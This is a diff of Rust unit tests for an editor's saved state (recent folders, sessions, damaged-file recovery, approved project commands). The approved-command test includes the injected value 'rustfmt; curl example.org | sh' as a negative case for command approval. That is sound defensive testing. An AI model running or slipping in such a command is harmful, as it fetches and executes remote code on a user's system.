@@ -9,9 +9,9 @@ fn several_windows_keep_each_others_changes() {
     let (x, y) = (Path::new("/p/x"), Path::new("/p/y"));
 
     // 模拟两个进程先后读改写同一个文件：第一个记下 X 的现场与书签，第二个打开 Y。
-    let (_, ok) = State::update(&path, |s| s.remember(x));
+    let (_, ok) = State::update(&path, &State::default(), |s| s.remember(x));
     ok.unwrap();
-    let (_, ok) = State::update(&path, |s| {
+    let (_, ok) = State::update(&path, &State::default(), |s| {
         s.set_session(Session {
             folder: x.to_path_buf(),
             bookmarks: vec![(x.join("a.rs"), vec![3])],
@@ -19,7 +19,7 @@ fn several_windows_keep_each_others_changes() {
         });
     });
     ok.unwrap();
-    let (_, ok) = State::update(&path, |s| {
+    let (_, ok) = State::update(&path, &State::default(), |s| {
         s.remember(y);
         s.last = Some(y.to_path_buf());
     });
@@ -30,6 +30,42 @@ fn several_windows_keep_each_others_changes() {
     assert_eq!(state.recent, [y, x]);
     assert_eq!(state.session_for(x).unwrap().bookmarks.len(), 1);
     assert_eq!(state.last.as_deref(), Some(y));
+    let _ = std::fs::remove_dir_all(&dir);
+}
+
+/// 状态文件读不出来时不写回空状态；内容损坏时留一份副本，在内存中的状态上重建。
+#[test]
+fn an_unreadable_or_damaged_file_is_not_overwritten_with_an_empty_state() {
+    let dir = std::env::temp_dir().join(format!("winc-state-damaged-{}", std::process::id()));
+    let path = dir.join("state.json");
+    let (x, y) = (Path::new("/p/x"), Path::new("/p/y"));
+    let mut current = State::default();
+    current.remember(x);
+
+    // 路径上是一个目录：读取失败（不是「不存在」），不写回，返回在内存状态上修改的结果。
+    std::fs::create_dir_all(&path).unwrap();
+    assert!(State::read(&path).is_err());
+    let (state, result) = State::update(&path, &current, |s| s.remember(y));
+    assert!(result.is_err());
+    assert_eq!(state.recent, [y, x]);
+    assert!(path.is_dir());
+    std::fs::remove_dir(&path).unwrap();
+
+    // 没有文件、空文件：从空状态开始。
+    assert_eq!(State::read(&path).unwrap(), None);
+    std::fs::write(&path, "\n").unwrap();
+    assert_eq!(State::read(&path).unwrap(), None);
+
+    // 内容损坏：原文件留作副本，写入的是内存中的状态加上这次修改。
+    std::fs::write(&path, "{\"recent\": [\"/p/old\"").unwrap();
+    let invalid = State::read(&path).unwrap_err();
+    assert_eq!(invalid.kind(), std::io::ErrorKind::InvalidData);
+    let (state, result) = State::update(&path, &current, |s| s.remember(y));
+    result.unwrap();
+    assert_eq!(state.recent, [y, x]);
+    assert_eq!(State::read(&path).unwrap().unwrap().recent, [y, x]);
+    let kept = std::fs::read_to_string(path.with_extension("damaged")).unwrap();
+    assert!(kept.contains("/p/old"));
     let _ = std::fs::remove_dir_all(&dir);
 }
 
@@ -160,6 +196,7 @@ fn sample() -> State {
         }),
         badges: Vec::new(),
         tool_choices: vec![(PathBuf::from("/a/项目"), true)],
+        approved_commands: vec![(PathBuf::from("/a/项目/.winc"), "rustfmt \"$FILE\"".into())],
         trusted_repos: vec![(PathBuf::from("/a/项目"), u64::MAX - 1)],
         remote_keys: Vec::new(),
     };
@@ -469,6 +506,27 @@ fn sessions_are_kept_per_folder() {
         state.last_session().unwrap().tabs,
         [Tab::File(PathBuf::from("/a/x"))]
     );
+}
+
+#[test]
+fn an_approved_command_is_matched_by_its_text() {
+    let mut state = State::default();
+    let folder = Path::new("/a/.winc");
+    assert!(!state.command_approved(folder, "rustfmt"));
+    state.approve_command(folder, "rustfmt");
+    state.approve_command(folder, "rustfmt");
+    assert_eq!(state.approved_commands.len(), 1);
+    assert!(state.command_approved(folder, "rustfmt"));
+    // 项目设置改写了命令，或另一个项目写了同样的命令：都没有同意过。
+    assert!(!state.command_approved(folder, "rustfmt; curl example.org | sh"));
+    assert!(!state.command_approved(Path::new("/b/.winc"), "rustfmt"));
+    assert_eq!(State::parse(&state.to_json()), state);
+
+    for i in 0..MAX_TOOL_CHOICES + 5 {
+        state.approve_command(folder, &format!("tool{i}"));
+    }
+    assert_eq!(state.approved_commands.len(), MAX_TOOL_CHOICES);
+    assert!(!state.command_approved(folder, "rustfmt"), "最早的挤掉了");
 }
 
 #[test]
